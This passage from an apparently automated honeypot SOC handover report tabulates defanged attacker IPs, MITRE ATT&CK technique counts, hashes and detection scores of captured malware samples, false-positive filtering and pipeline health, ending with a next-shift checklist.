| `135.237.125[.]118` | **2** | 2026-06-08 14:14 | 2026-06-08 14:14 | 0m | 0 | `T1592` | 🟢 LOW |
| `18.226.84[.]243` | **2** | 2026-06-08 13:41 | 2026-06-08 13:45 | 0m | 0 | `T1592` | 🟢 LOW |
| `185.247.137[.]187` | **2** | 2026-06-08 13:00 | 2026-06-08 13:01 | 0m | 0 | `T1592` | 🟢 LOW |
| `199.45.154[.]124` | **2** | 2026-06-08 15:53 | 2026-06-08 15:53 | 0m | 0 | `T1592` | 🟢 LOW |
| `20.65.194[.]108` | **2** | 2026-06-08 13:00 | 2026-06-08 13:00 | 0m | 0 | `T1592` | 🟢 LOW |
| `35.205.158[.]243` | **2** | 2026-06-08 14:27 | 2026-06-08 14:27 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `103.154.158[.]70` | 1 | 2026-06-08 15:06 | 2026-06-08 15:06 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `103.161.170[.]12` | 1 | 2026-06-08 14:00 | 2026-06-08 14:00 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `106.12.157[.]104` | 1 | 2026-06-08 13:55 | 2026-06-08 13:57 | 120s | 0 | `T1592` | 🟢 LOW |
| `107.197.183[.]81` | 1 | 2026-06-08 15:10 | 2026-06-08 15:10 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `114.219.157[.]97` | 1 | 2026-06-08 13:56 | 2026-06-08 13:58 | 120s | 0 | `T1592` | 🟢 LOW |
| `115.190.192[.]114` | 1 | 2026-06-08 13:38 | 2026-06-08 13:40 | 120s | 0 | `T1592` | 🟢 LOW |
| `117.34.85[.]185` | 1 | 2026-06-08 14:25 | 2026-06-08 14:27 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.145.237[.]236` | 1 | 2026-06-08 11:33 | 2026-06-08 11:35 | 120s | 0 | `T1592` | 🟢 LOW |
| `128.199.25[.]179` | 1 | 2026-06-08 15:13 | 2026-06-08 15:14 | 44s | 0 | `T1592` | 🟢 LOW |
| `14.103.115[.]181` | 1 | 2026-06-08 11:35 | 2026-06-08 11:37 | 99s | 0 | `T1592` | 🟢 LOW |
| `14.103.118[.]120` | 1 | 2026-06-08 13:37 | 2026-06-08 13:39 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.29.181[.]34` | 1 | 2026-06-08 13:55 | 2026-06-08 13:57 | 120s | 0 | `T1592` | 🟢 LOW |
| `194.88.204[.]44` | 1 | 2026-06-08 14:44 | 2026-06-08 14:45 | 30s | 0 | `T1592` | 🟢 LOW |
| `222.86.13[.]5` | 1 | 2026-06-08 11:22 | 2026-06-08 11:22 | 13s | 0 | `T1592` | 🟢 LOW |
| `3.23.59[.]247` | 1 | 2026-06-08 12:52 | 2026-06-08 12:52 | 0s | 0 | `T1592` | 🟢 LOW |
| `3.88.220[.]252` | 1 | 2026-06-08 13:11 | 2026-06-08 13:11 | 0s | 0 | `T1592` | 🟢 LOW |
| `37.46.18[.]151` | 1 | 2026-06-08 15:31 | 2026-06-08 15:31 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `45.129.242[.]233` | 1 | 2026-06-08 14:24 | 2026-06-08 14:24 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `45.40.143[.]166` | 1 | 2026-06-08 12:42 | 2026-06-08 12:43 | 31s | 0 | `T1592` | 🟢 LOW |
| `5.226.140[.]93` | 1 | 2026-06-08 13:53 | 2026-06-08 13:53 | 0s | 0 | `T1592` | 🟢 LOW |
| `5.231.70[.]13` | 1 | 2026-06-08 12:00 | 2026-06-08 12:01 | 30s | 0 | `T1592` | 🟢 LOW |
| `50.84.211[.]204` | 1 | 2026-06-08 14:12 | 2026-06-08 14:12 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `52.188.146[.]204` | 1 | 2026-06-08 11:25 | 2026-06-08 11:25 | 30s | 0 | `T1592` | 🟢 LOW |
| `89.47.53[.]19` | 1 | 2026-06-08 11:34 | 2026-06-08 11:34 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `97.74.87[.]152` | 1 | 2026-06-08 13:25 | 2026-06-08 13:25 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (35 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0d3d2e513043f33923c8538f0d40b246730eb64d685628c28b89b04b6efcabf3` | ELF Binary (Linux executable) (x86-64 64-bit) | `0d3d2e513043f339...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `235596e7fb00cc04e95c500b5d02891e4b5d5ee54d063553a62c93b6bbd3eb9a` | ELF Binary (Linux executable) (ARM 32-bit) | `235596e7fb00cc04...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `321bfd80417496f99f32183c73d0a46b42900a8ae9d87b4079740b9297bc3cb4` | ELF Binary (Linux executable) (ARM 32-bit) | `321bfd80417496f9...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `80c3fe2ae1062abf56456f52518bd670f9ec3917b7f85e152b347ac6b6faf880` | Unknown binary | `80c3fe2ae1062abf...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `99ac78541bb555b05a2c82d6c191d62e639b9fefd26ddee1f813b79cc6baf4f0` | ELF Binary (Linux executable) (MIPS 32-bit) | `99ac78541bb555b0...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a2f3d6d2bd82a65939f4e939bce242e8e246014fb3a9a9d5c3769ed7dcfffe24` | Unknown binary | `a2f3d6d2bd82a659...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **32/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `fc6f8ae5f64e4f17481f7e3be29a1c56949f216a998414188003eae1db20c9e5` | GZip Archive | `fc6f8ae5f64e4f17...` | 14/100 | 🟢 LOW | **35/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `37.46.18[.]151` | DE | Cloud Hosting Solutions, Limited. | **100** ⚠️ | 0 |
| `128.199.25[.]179` | IN | DigitalOcean, LLC | **100** ⚠️ | 2 |
| `194.88.204[.]44` | RU | OOO MIGRAPH | **100** ⚠️ | 13 |
| `45.40.143[.]166` | US | GoDaddy.com, LLC | **100** ⚠️ | 4 |
| `3.23.59[.]247` | US | Amazon Technologies Inc. | **100** ⚠️ | 1 |
| `199.45.154[.]124` | HK | Censys, Inc. | **100** ⚠️ | 50 |
| `3.88.220[.]252` | US | Amazon Data Services Northern Virginia | **100** ⚠️ | 9 |
| `117.34.85[.]185` | CN | CHINANET Shanxi(SN) province network | **100** ⚠️ | 10 |
| `68.183.212[.]68` | DE | DigitalOcean, LLC | **100** ⚠️ | 3 |
| `217.253.123[.]44` | DE | Deutsche Telekom AG | **100** ⚠️ | 1 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 553 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 288 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 164 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 82 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 82 |

---

## 🔕 False Positive Summary (65 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 9 |
| AbuseIPDB score 18 below threshold 25 | 3 |
| AbuseIPDB score 20 below threshold 25 | 3 |
| AbuseIPDB score 23 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 48 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 805 cases |
| Tool 34  | Credential Extractor        | ✅ 485 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 13 fingerprints |
| Tool 36  | Command Clustering          | ✅ 4 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 70 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 65 filtered (8.1%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 47 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 35 files |
| Tool 33  | YARA Classifier             | ✅ 10 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 161 priority case(s) shown individually · 57 recon entry/entries in table (32 group(s) consolidating 554 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-06-08T15:59:47Z_
